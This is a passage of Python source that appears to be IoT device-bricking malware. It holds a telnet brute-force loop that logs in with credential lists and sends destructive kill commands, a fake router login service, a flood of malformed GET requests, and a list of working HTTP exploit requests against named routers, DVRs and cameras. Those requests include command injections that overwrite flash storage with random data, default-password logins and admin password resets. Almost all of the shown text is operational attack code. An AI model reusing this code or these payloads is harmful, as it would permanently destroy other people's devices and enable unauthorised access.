                        cmd_kill_send[target_sockhash] = cmd_kill
                        if not send_cmd_kill(s, target_sockhash, masterhash):
                            continue

                if targeted_step[target_sockhash] == 7:
                    if re.search(cmd_kill_send[target_sockhash][1],
                                 targeted_banner2[target_sockhash]
                                 ):
                        cmd_kill_send[target_sockhash] = cmd_kill_send[target_sockhash][2:]
                        masterhash = targeted_masterhash[target_sockhash]
                        if not send_cmd_kill(s, target_sockhash, masterhash):
                            continue
            else:
                close_sock(s)
                continue

        if s in sockreadyw:
            if targeted_step[target_sockhash] == -1:
                try:
                    s.send("\n")
                except:
                    close_sock(s)
                    continue
                targeted_step[target_sockhash] = 0

            if targeted_step[target_sockhash] == 1:
                masterhash = targeted_masterhash[target_sockhash]
                username = ''
                if 'XXX:' in credentials_attack[masterhash][cred_i[masterhash]]:
                    regresult = re.search('XXX:([^:]+):',
                                         credentials_attack[masterhash][cred_i[masterhash]]
                                         )
                    if regresult:
                        username = regresult.group(1)
                else:
                    username = (credentials_attack[masterhash]
                                [cred_i[masterhash]].split('/')[0])

                try:
                    s.send(username + "\n")
                except:
                    close_sock(s)
                    continue

                targeted_banner2[target_sockhash] = ''
                targeted_step[target_sockhash] = 2

            if targeted_step[target_sockhash] == 3:
                masterhash = targeted_masterhash[target_sockhash]
                password = ''
                if 'XXX:' in credentials_attack[masterhash][cred_i[masterhash]]:
                    regresult = re.search('XXX:[^:]+:(\S+)',
                                          credentials_attack[masterhash]
                                          [cred_i[masterhash]]
                                          )
                    if regresult:
                        password = regresult.group(1)
                else:
                    password = (credentials_attack[masterhash]
                                [cred_i[masterhash]].split('/')[1])
                try:
                    s.send(password + "\n\n")
                except:
                    close_sock(s)
                    continue
                targeted_banner2[target_sockhash] = ''
                targeted_step[target_sockhash] = 4

            if targeted_step[target_sockhash] == 5:
                masterhash = targeted_masterhash[target_sockhash]
                cmd_OEM = ''
                cmd_kill = ''
                for cmd in cmd_brick:
                    if (re.search(cmd[1], cred_attack_master[masterhash]) and
                        (cmd[2] == '' or
                         (cmd[2] == 'PORT:9527:' and
                          targeted_target2[masterhash][1] == 9527)  # port.
                         )
                        ):
                        cmd_OEM = cmd[0]
                        cmd_kill = cmd[3:]
                        break
                if cmd_OEM:
                    targeted_step[target_sockhash] = 7
                    targeted_OEM[masterhash] = cmd_OEM
                    cmd_kill_send[target_sockhash] = cmd_kill
                    if not send_cmd_kill(s, target_sockhash, masterhash):
                        continue
                    continue
                else:
                    try:
                        s.send(cmd_scantarget)
                    except:
                        close_sock(s)
                        continue
                    targeted_step[target_sockhash] = 6
                    continue

        if (targeted_step[target_sockhash] == 7 and
            timenow > time_nextattack[target_sockhash]
            ):
            if len(cmd_kill_send[target_sockhash]) <= 2:
                time_nextattack[target_sockhash] = timenow + 10
                targeted_step[target_sockhash] = 9
                try:
                    s.shutdown()
                except:
                    pass
                continue
            else:
                cmd_kill_send[target_sockhash] = cmd_kill_send[target_sockhash][2:]
                masterhash = targeted_masterhash[target_sockhash]
                if not send_cmd_kill(s, target_sockhash, masterhash):
                    continue
        if (targeted_step[target_sockhash] == 9 and
            timenow > time_nextattack[target_sockhash]
            ):
            close_sock(s)
            continue

        timetowait = waitafterlogin
        if targeted_step[target_sockhash] >= 5:
            timetowait = waitafterlogin
        if timenow - targeted_time[target_sockhash] > timetowait:
            if targeted_step[target_sockhash] == 4:
                masterhash = targeted_masterhash[target_sockhash]
                if ('command' in targeted_banner2[target_sockhash] or
                    'help' in targeted_banner2[target_sockhash]
                    ):
                    if (not 'DEBUG avc' in targeted_banner2[target_sockhash] and
                        not 'Polycom' in targeted_banner2[target_sockhash]
                        ):
                        if not hash(targeted_target2[masterhash][0]) in targeted_unk:  # hash(IP)
                            regresult = re.sub('\r?\n', ';', targeted_banner1[target_sockhash])
                            regresult = re.sub('[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]',
                                               '',
                                               regresult
                                               )
                            printstatus('NOTC: CMDEBUG IP %s:%d %s -> %s' %
                                        (targeted_target2[masterhash][0],  # IP
                                         targeted_target2[masterhash][1],  # port
                                         credentials_attack[masterhash][cred_i[masterhash]],
                                         regresult[:768]
                                         )
                                        )
                            targeted_unk[hash(targeted_target2[masterhash][0])] = 1
            close_sock(s)
            continue


timetoclose = 17  # Time to wait until incoming connection is closed.
pauseuntilbanner = 5  # Time to wait until send banner to incoming connection.

# List of telnet host sockets. Elemenets are socket.socket() objects.
host_sock = []

# Dictionary of telnet host info. Key is hash(sock.sock()) of target. Value is
# tuple of IP, port, a random route banner from routerbanners, and a password
# prompt.
hostinfo = {}

# Dictionary of step in telnet host server response. Key is hash(sock.sock()) of
# target. Value is step number.
# -1: Initial default value. Will send TELNET IAC commands.
# 0: Pause until send banner.
# 1: Send banner.
# 2: Receive and echo input from client.
# 3: Send prompt for password to client.
# 4: Receive input from client.
# 5: Send message that password was incorrect.
# 6: Close connection.
targeted2_step = {}

# Dictionary of data received from incoming connections. Key is
# hash(sock.sock()) of target. Value is data received from incoming connections.
indata = {}

# Dictionary of data received from incoming connection. Key is hash(sock.sock())
# of target. Value is data received from incoming connections.
incomingdata = {}

# Dictinoary of whether socket was initiated for target. Key is
# hash(sock.sock()) of target. Value is None or 1 if socket was initiated
# using initsock().
sockinitiated = {}

# Dictionary of times when sockets were instanced. Key is hash(sock.sock()) of
# target. Value is time when target socket was instanced.
timestart = {}


def convertstring(input):
    """
    Convert special characters in input string into hex values (ie A -> \x41).

    Inputs:
        input: String to be filtered.

    Outputs:
        None.

    Returns:
        returnstring containing input string but with special characters
        converted into hex.
    """
    returnstring = ''
    for idx in range(len(input)):  # idx = O0OooO0Oo0O
        char = input[idx]
        asciinum = ord(char)
        #  If special char, write as hex number.
        if (asciinum < 32 or  # NUL, CR, ESC, etc.
            asciinum >= 123 or  # {, |, }, etc.
            asciinum == 96 or  # `
            asciinum == 36 or  # $
            asciinum == 38  # &
            ):
            returnstring += '\\x%02x' % (asciinum)
        else:
            returnstring += char
    return returnstring


def close_sock2(sock):
    """
    This closes a socket from host_sock[].

    Inputs:
        sock: The socket object to be closed.

    Outputs:
        Various lists and dictionaries such as targted2_sock and hostinfo
        are updated.

    Returns:
        None.
    """
    global timetoclose

    sockhash = hash(sock)
    try:
        sock.close()
    except:
        pass

    if sockinitiated[sockhash] == 0:
        if targeted2_step[sockhash] >= 3:
            indatatext = convertstring(indata[sockhash])
            # Concatonate and remove non-alphanumerics.
            regresult = re.sub('\r?\n', ';', hostinfo[sockhash][2])
            regresult = re.sub('[^A-Za-z0-9]', '', regresult)
            printstatus("%s:%d HP:%s:%%:%s" % (hostinfo[sockhash][0],
                                               hostinfo[sockhash][1],
                                               regresult[:16],
                                               indatatext[:128]
                                               )
                        )

    host_sock.remove(sock)
    hostinfo[sockhash] = None
    targeted2_step[sockhash] = None
    indata[sockhash] = None
    incomingdata[sockhash] = None
    sockinitiated[sockhash] = None
    timestart[sockhash] = None


routerbanners = ['-------------------------------\r\n'
                 '-----Welcome to ATP Cli------\r\n'
                 '-------------------------------'
                 '\r\n'
                 '\r\n'
                 'Login: ',

                 '\r\n(none) login: ',

                 'Ruijie login: ',

                 '=======================\r\n'
                 '        DSL-500B \r\n'
                 '=======================\r\n'
                 'Login: ',

                 '\r\n'
                 'ralink login: ',

                 'Login as: ',

                 'Welcome to Stbs world\r\n'
                 '\r\n'
                 'Username: ',

                 'BCM96328 Broadband Router\r\n'
                 'Login: '
                 'BCM99999 Broadband Router\r\n'
                 'VosLogin: ',

                 'Welcome Visiting Huawei Home Gateway\r\n'
                 'Copyright by Huawei Technologies Co., Ltd.\r\n'
                 '\r\n'
                 'Login: ',

                 'User Access Verification\r\n'
                 '\r\n'
                 'Username: ',

                 '\r\nWelcome to VeEX(R) V100-IGM/MPX Console.\r\n'
                 '\r\n'
                 '(none) login: ',

                 'ZyXEL P-870HNU-51B\r\n'
                 'Login: ',

                 'Account: ',
                 'Air5442 login: ',
                 'Air5650 login: ',
                 'Air5444TT login: ',
                 'tc login: ',
                 'RT-206v4TT login: ',
                 'BCM96318 Broadband Router\r\n'
                 'Login: ',

                 '\r\nIngenic linux machine\r\n'
                 'Kernel 2.6.31.3 on an mips\r\n'
                 'kopp login: ',

                 '\r\nBusyBox on (none) login: ',
                 'JZ_INGENIC login: '
                 ]
rand_routerbanner = random.choice(routerbanners)


def initsock(connsocket, remote_ip, target_port):
    """
    This function initiates a socket for incoming connections.

    Inputs:
        connsocket: Socket.socket() object for incoming connection.
        remote_ip: Port of host of incoming connection.
        target_port: Local port for incoming connection.

    Outputs:
        Updates some lists and dictionaries such as incomingdata[], etc.

    Returns:
        None.
    """

    global rand_routerbanner
    arouterbanner = rand_routerbanner
    passprompt = 'Password: '

    unused = (remote_ip, int(target_port))  # Target info not used anywhere?
    sockhash = hash(connsocket)
    host_sock.append(connsocket)
    hostinfo[sockhash] = (remote_ip,
                          int(target_port),
                          arouterbanner,
                          passprompt)
    targeted2_step[sockhash] = -1
    indata[sockhash] = ''
    incomingdata[sockhash] = ''
    timestart[sockhash] = time.time()
    sockinitiated[sockhash] = 0


def hosttelnet():
    """
    This function prepares responses to incoming connections on port 23 or
    2323, ie Telnet. It serves a randomly selected banner from routerbanners,
    asks for a password, then responds that login is incorrect and drops the
    connection. It will also drop incoming hosts who have tried to connect
    before (see main loop).

    Inputs:
        None.

    Outputs:
        None.

    Returns:
        None.
    """

    global timetoclose
    global pauseuntilbanner

    timenow = time.time()

    timeout = 0.01
    sockreadyr, sockreadyw, noneready = select.select(host_sock,
                                                      host_sock,
                                                      [],
                                                      timeout
                                                      )

    for s in host_sock:
        sockhash = hash(s)
        s_opt = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        if s_opt != 0:
            close_sock2(s)
            continue
        if s in sockreadyr:
            intext = ''
            try:
                intext = s.recv(2048)
            except:
                pass

            if intext:
                incomingdata[sockhash] += intext
                if targeted2_step[sockhash] == 0:
                    pass
                if targeted2_step[sockhash] == 2:
                    indata[sockhash] += intext

                    # Echo data, except 0x00-0x1f.
                    try:
                        intext = re.sub('[\x00-\x1f]', '', intext)
                        s.send(intext)
                    except:
                        pass

                    if ('\n' in incomingdata[sockhash] or
                        '\r' in incomingdata[sockhash]
                        ):
                        targeted2_step[sockhash] = 3
                        incomingdata[sockhash] = ''
                        try:
                            s.send('\r\n')
                        except:
                            pass
                        continue

                if targeted2_step[sockhash] == 4:
                    indata[sockhash] += intext

                    if ('\n' in incomingdata[sockhash] or
                        '\r' in incomingdata[sockhash]
                        ):
                        incomingdata[sockhash] = ''
                        targeted2_step[sockhash] = 5
                        continue

                if targeted2_step[sockhash] == 6:
                    close_sock2(s)
                    continue

            else:
                close_sock2(s)
                continue

        if s in sockreadyw:
            if targeted2_step[sockhash] == - 1:
                try:
                    # Send IAC WILL SUPPRESS GO-AHEAD, IAC WILL ECHO,
                    # IAC DO NEGOTIATE ABOUT WINDOW SIZE, IAC IAC DO TERMINAL
                    # TYPE.
                    s.send('\xff\xfb\x03\xff\xfb\x01\xff\xfd\x1f\xff\xfd\x18')
                except:
                    close_sock2(s)
                    continue
                targeted2_step[sockhash] = 0
                continue
            if targeted2_step[sockhash] == 1:
                try:
                    # Send random router banner.
                    s.send(hostinfo[sockhash][2])
                except:
                    close_sock2(s)
                    continue
                targeted2_step[sockhash] = 2
                continue
            if targeted2_step[sockhash] == 3:
                try:
                    # Send prompt for password.
                    s.send(hostinfo[sockhash][3])
                except:
                    close_sock2(s)
                    continue
                targeted2_step[sockhash] = 4
                continue
            if targeted2_step[sockhash] == 5:
                message = '\r\nLogin incorrect. Try again.\r\n'
                try:
                    s.send(message)
                except:
                    close_sock2(s)
                    continue
                targeted2_step[sockhash] = 6
                continue

            if targeted2_step[sockhash] == 0:
                timetowait = pauseuntilbanner
                if timenow - timestart[sockhash] > timetowait:
                    incomingdata[sockhash] = ''
                    targeted2_step[sockhash] = 1
                    continue

        timetowait = timetoclose
        if timenow - timestart[sockhash] > timetowait:
            close_sock2(s)
            continue


time_timeout = 20  # Time when connection is considered to have timed out.
time_wait_job = 120  # Time to wait until connection timesout until reconnect.

wait_job = 95  # Time to wait for jobs to restart, in minutes.

webtargets_maxN = 500  # Maximum number of connections to have to web targets.

# List of socket.socket() objects of (web?) targets.
webtargets_sock = []

# Dictionary of (web?) target socket.socket() objects. Keys are 
# hash(socket.socket()) of the target. Values are (targetip, int(targetport)).
webtargets_targets = {}

# Dictinoary of (web?) target job hashes (hash(hash(socket.socket()). Keys are
# hash(socket.socket()) of the targets. Values are job hashes.
webtargets_jobhash = {}

# Dictionary of (web?) targets indicating whether GET ..///////// request (named
# getrequest) has been sent. Keys are hash(socket.socket()) of target. Values
# are 0 if request has not been sent, or 1 if request has been sent.
sentgetrequest = {}

# Dictionary of (web?) targets indicating time of last connection to target.
# Keys are hash(socket.socket()) of target. Values are time of last connection.
webtargets_timeconn = {}

# List containing (web?) targets as hash(targetip, int(targetport)).
webtargets_hash = []

# Dictionary containing (web?) targets. Keys are
# hash(targetip, int(targetport)). Values are (targetip, int(targetport)).
webtargets_target = {}

# Dictionary containing number of times (web?) target connections were
# attempted, counted when the connection is closed. Keys are
webtargets_connectN = {}

# Dictionary containing time to start job. Keys are hash(targetip, targetport).
# Values are time at which job should be executed.
time_job = {}

# Dictionary of job sockets. Keys are hash(sock.sock()) job hashes. Values are
# socket.socket() objects.
webtargets_s = {}

getrequest = 'GET ../////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// HTTP/1.0\r\n\r\n'


def init_webtarget(targetip, targetport):
    """
    This function initiates a target by adding it to appropriate lists.

    Inputs:
        targetip: IP of host target.
        targetport: Port of target host.

    Outputs:
        Target host information is added to webtargets_target, time_job, etc.

    Returns:
        None.
    """
    global wait_job

    s_target = (targetip, int(targetport))
    targethash = hash(s_target)
    if targethash in webtargets_hash:
        return

    webtargets_connectN[targethash] = 0
    webtargets_target[targethash] = (targetip, int(targetport))
    time_job[targethash] = time.time() + (wait_job * 60)
    webtargets_s[targethash] = None
    webtargets_hash.append(targethash)


def connectwebtarget(targetip, targetport, jobhash):
    """
    This function connects to a (web?) target and returns the socket.socket()
    object. Note that there is no indication if socket connection is successful.

    Inputs:
        targetip: IP of (web?) target host.
        targetport: Port of (web?) target host.
        jobhash: jobhash (hash(targetip, int(targetport))) of target.
    Outputs:

    Returns:
         Socket.socket() object.
    """
    s_target = (targetip, int(targetport))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)

    try:
        s.connect(s_target)
    except:
        pass

    s_hash = hash(s)
    webtargets_sock.append(s)
    webtargets_targets[s_hash] = (targetip, int(targetport))
    sentgetrequest[s_hash] = 0

    webtargets_timeconn[s_hash] = time.time()
    webtargets_jobhash[s_hash] = jobhash
    webtargets_s[jobhash] = s

    return s


def drop_webtarget(webhash):
    """
    This function drops a target based on input hash.

    Inputs:
        webhash: Hash of target host (hash(hash(socket.socket())).

    Outputs:
        Updates to lists such as webtargets_connectN, webtargets_target.

    Returns:
        None.
    """

    webtargets_connectN[webhash] = None
    webtargets_target[webhash] = None
    time_job[webhash] = None
    webtargets_s[webhash] = None

    webtargets_hash.remove(webhash)


def timeout(sock):
    """
    This function closes a web target sockect connection after it times out. It
    will update lists and dictionaries containing target information.

    Inputs:
        sock: Socket.socket() of target host being dropped due to timeout.

    Outputs:
        It will update lists such as webtargets_sock, webtargets_targets, etc.

    Returns:
        None.
    """
    global webtargets_maxN
    global time_wait_job
    global time_timeout

    s_hash = hash(sock)
    jobhash = webtargets_jobhash[s_hash]

    try:
        sock.close()
    except:
        pass

    timenow = time.time()
    if time_job[jobhash] <= timenow:
        time_job[jobhash] = time.time() + time_wait_job
    webtargets_s[jobhash] = None
    webtargets_connectN[jobhash] += 1

    webtargets_sock.remove(sock)
    webtargets_targets[s_hash] = None
    sentgetrequest[s_hash] = None

    webtargets_timeconn[s_hash] = None
    webtargets_jobhash[s_hash] = None


def connecttowebtargets():
    """
    This funciton connects to all webtargets, as enumerated in
    webtargets_target[].

    Inputs:
        None.

    Outputs:
        Updates webtarget_s[] (containing socket to target) and time_job.

    Returns:
        None.
    """

    global xmpinpayloads
    global webtargets_maxN

    timenow = time.time()
    hashes = webtargets_hash
    for ahash in hashes:
        jobhash = hash(ahash)
        if webtargets_s[jobhash] == None:
            if webtargets_connectN[jobhash] >= webtargets_maxN:
                drop_webtarget(jobhash)
                continue

            if timenow >= time_job[jobhash]:
                connectsock = connectwebtarget(webtargets_target[jobhash][0],
                                       webtargets_target[jobhash][1],
                                       jobhash
                                       )  # IP, port, jobhash.
                webtargets_s[jobhash] = connectsock
                time_job[jobhash] = 0


def sendgetrequest(sock, webhash, jobhash):
    """
    This function sends the GET request, i.e. GET .//////////// etc.

    Inputs:
        sock: Socket object of target host to which GET request will be sent.
        webhash: Unused.
        jobhash: Unused.

    Outputs:
        None.

    Returns:
        1. Note that no other value will be returned.
    """
    global getrequest
    try:
        sock.send(getrequest)
    except:
        pass
    return 1


def webtargets_sendrequests():
    """
    This function send the GET .////////////// request to the web targets.

    Inputs:
        None.

    Outputs:
        None.

    Returns:
        None.
    """

    global time_timeout
    global xmpinclient_maxconnectiontime_payload

    timenow = time.time()

    timeout = 0.01
    sockreadyr, sockreadyw, noneready = select.select(webtargets_sock,
                                                      webtargets_sock,
                                                      [],
                                                      timeout)

    for s in webtargets_sock:
        sockhash = hash(s)
        s_opt = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        if s_opt != 0:
            timeout(s)
            continue
        if s in sockreadyr:
            intext = ''

            try:
                intext = s.recv(2048)
            except:
                pass

            if intext:
                pass
            else:
                timeout(s)
                continue

        if s in sockreadyw:
            if sentgetrequest[sockhash] == 0:
                jobhash = webtargets_jobhash[sockhash]
                sendgetrequest(s, sockhash, jobhash)
                sentgetrequest[sockhash] = 1

        timetowait = time_timeout
        jobhash = webtargets_jobhash[sockhash]

        if timenow - webtargets_timeconn[sockhash] > timetowait:
            timeout(s)
            continue


time.sleep(3)

O0O = "SPLTX"  # Not visibly used in this code.

HTTP_wait_timeout = 60  # Time between HTTP requests, but only 15 if timeout.
HTTP_wait = 0.5  # Time to wait between HTTP connections.

# HTTP requests for penetrating a variety of routers, IoT, etc.
# cmd_HTTP[0] = OEM name.
# cmd_HTTP[1] = banner hint.
# cmd_HTTP[2:] = HTTP requests to gain access to target.
cmd_HTTP = [
          ['avtech',
           'Linux.*UPnP.*Avtech',
           'GET /cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.* HTTP/1.0\r\n\r\n',
           'GET /cgi-bin/nobody/VerifyCode.cgi?account=%%CUSTOM1%%&login=quick HTTP/1.0\r\n\r\n',
           ],
          ['wificam', 'GoAhead-Webs.*WIFICAM',
           'GET system.ini HTTP/1.0\r\n\r\n',
           'GET login.cgi HTTP/1.0\r\n\r\n',
           ],
          ['dahua', '(["/=]more\.js|title>WEB SERVICE</title|css/fn.css|CPPLUS DVR|CONTENT-LENGTH:)',
           'GET /current_config/passwd HTTP/1.0\r\n\r\n',
           'POST /RPC2_Login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload\r\n\r\n{"method":"global.login","params":{"userName":"%%CUSTOM1%%","password":"","clientType":"Dahua3.0-Web3.0-NOTIE"},"id":10000}',
           ],
          ['homestation', '200 Ok.*Server: minihttpd/.*window\.location\.href = /html/gui/;',
           'GET /cgi-bin/webproc HTTP/1.0\r\n\r\n',
           'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ngetpage=html%2Findex.html&errorpage=html%2Fmain.html&var%3Amenu=setup&var%3Apage=wizard&obj-action=auth&%3Ausername=TelefonicaUser&%3Apassword=user&%3Aaction=login&%3Asessionid=%%CUSTOM1%%',
           ],
          ['observa', '200 Ok.*Server: minihttpd/.*window\.location\.href = /cgi-bin/webproc;',
           'GET /cgi-bin/webproc HTTP/1.0\r\n\r\n',
           'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=support\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ngetpage=html%2Fwizard%2Fguidesecond.html&var%3Apage=*&obj-action=auth&%3Ausername=%%LOGIN%%&%3Apassword=%%PASSWORD%%&%3Aaction=login&%3Asessionid=%%CUSTOM1%%',
           ],
          ['hg532', '(CACHE-CONTROL|Cache-Control): no-cache.*LoginTimes.*Cookieflag',
           'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=admin&Password=OGM2OTc2ZTViNTQxMDQxNWJkZTkwOGJkNGRlZTE1ZGZiMTY3YTljODczZmM0YmI4YTgxZjZmMmFiNDQ4YTkxOA%3D%3D',
           'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=instalador&Password=N2MwNGQxMzUzNzI1Y2ZkNzU4ZTFhYzNjM2JjZGRiMDkxNWNlNzA4OWU1NTlkODQ0Yjk2YTU4MjFmNTM1N2Y4Mg%3D%3D',
           ],
          ['hg532a', 'util\.js.*LoginTimes.*Cookieflag',
           'POST /login.cgi?Username=admin&Password=YWRtaW4=&Language=0&RequestFile=html/content.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
           'POST /html/network/setcfg.cgi?y=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement&x=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1&RequestFile=html/network/dhcp.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_1; SecondMenu=Admin_1_1; ThirdMenu=Admin_1_1_2; sessionID=%%CUSTOM1%%; Language=English\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nx.IPInterfaceIPAddress=10.%%RAND8%%&x.IPInterfaceSubnetMask=255.255.255.0&y.MinAddress=10.%COMP8%%&y.MaxAddress=10.%%COMP8%%&y.X_ATP_STB-MinAddress=0.0.0.0&y.X_ATP_STB-MaxAddress=0.0.0.0&y.X_ATP_STB-DHCPRelay=0&y.X_ATP_STB-DHCPOption60=&y.DNSServers=&y.DomainName=&y.UseAllocatedWAN=&y.AssociatedConnection=&y.PassthroughMACAddress=&y.DHCPLeaseTime=86400&y.DHCPServerEnable=1&y.X_ATP_DHCPRelayEnable=0&y.X_ATP_DHCPRelayLAN1=0&y.X_ATP_DHCPRelayLAN2=0&y.X_ATP_DHCPRelayLAN3=0&y.X_ATP_DHCPRelayLAN4=0&y.X_ATP_DHCPRelaySSID1=0&y.X_ATP_DHCPRelaySSID2=0&y.X_ATP_DHCPRelaySSID3=0&y.X_ATP_DHCPRelaySSID4=0',
           ],
          ['zxdsl831', 'microhttpd.*realm=DSL Router;',
           'GET /connoppp.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
           'GET /connoppp.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
           ],
          ['engenius', 'lighttpd.*web\/j`\.js.*getlanguagejs\.htm',
           'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\nHost: %%TARGETIP%%:%%TARGETPORT%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=7&path=\"|cat /dev/urandom >/dev/mtdblock6||\"',
           'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\nHost: %%TARGETIP%%:%%TARGETPORT%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=7&path=\"|cat /dev/urandom >/dev/mtdblock4||\"',
           ],
          ['crossweb', 'Cross Web Server',
           'GET /language/Swedish${IFS}&&mkdosfs${IFS}${HOME}dev${HOME}mtd0${IFS}9999${IFS}&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
           'GET /language/Swedish${IFS}&&mkdosfs${IFS}${HOME}dev${HOME}mtd1${IFS}9999${IFS}&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
           ],
          ['hanbang', 'Server: NVR Webserver',
           'PUT /ISAPI/Security/users/1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nX-Requested-With: XMLHttpRequest\r\nAuthorization: Basic YWRtaW46ODg4ODg4\r\nCookie: updateTips=true; streamType=0; BufferLever=1; userInfo%%TARGETPORT%%=YWRtaW46ODg4ODg4; DevID=5; language=en; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<User><id>1</id><userName>admin</userName><password>admin</password><bondIpList><bondIp><id>1</id><ipAddress>0.0.0.0</ipAddress><ipv6Address>::</ipv6Address></bondIp></bondIpList><macAddress/><userLevel>administrator</userLevel><attribute><inherent>true</inherent></attribute></User>',
           'GET /ISAPI/Security/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46ODg4ODg4\r\nCookie: language=en; updateTips=true\r\n\r\n',
           ],
          ['grandstream', 'Server: GS-Webs',
           'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',
           'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU=\r\n\r\n',
           ],
          ['dir300600', '(DIR-600 Ver 2\.1[1234]|DIR-300 Ver 2\.1[23])',
           'POST /command.php HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ncmd=route del default;iproute del default;ip route del default;cat /dev/urandom >/dev/mtdblock/0;cat /dev/urandom >/dev/mtdblock/1;cat /dev/urandom >/dev/mtdblock/2;cat /dev/urandom >/dev/mtdblock/3;cat /dev/urandom >/dev/mtdblock/4;cat /dev/urandom >/dev/mtdblock/5;cat /dev/urandom >/dev/mtdblock/6;cat /dev/urandom >/dev/mtdblock/7;cat /dev/urandom >/dev/root;cat /dev/urandom >/dev/mem;',
           'GET / HTTP/1.0\r\n\r\n',
           ],
          ['dir850', 'Server: Linux, HTTP.*DIR-850L Ver',
           'POST /hedwig.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-type: text/xml\r\nCookie: uid=aDxpxsreSa\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version=\'1.0\' encoding=\'UTF-8\'?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>',
           'GET /authentication.cgi HTTP/1.0\r\n\r\n',
           ],
          ['hikweb', 'Server: (DNVRS-Webs|DVS-Webs|App-webs|DVRDVS-Webs|Hikvision-Webs)',
           'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU=\r\nCookie: language=en; updateTips=true\r\n\r\n',
           'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nCookie: language=en; updateTips=true\r\n\r\n',
           ],
          ['sify', '200 OK.*Accept-Ranges: bytes.*Expires.*content=-1.*0; URL=/cgi-bin/luci',
           'POST /cgi-bin/luci/;stok=15443bacdb9a6ddd5df893eef7cbb995 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=login&username=admin&password=admin',
           'GET /cgi-bin/luci/;strok=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\n\r\n',
           ],
          ['zyxelp660', 'RomPager.*Welcome to the Web-Based Configurator.*GoLive Cyber',
           'POST /Forms/rpAuth_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLoginPassword=ZyXEL+ZyWALL+Series&hiddenPassword=81dc9bdb52d04dc20036dbd8313ed055&Prestige_Login=Login',
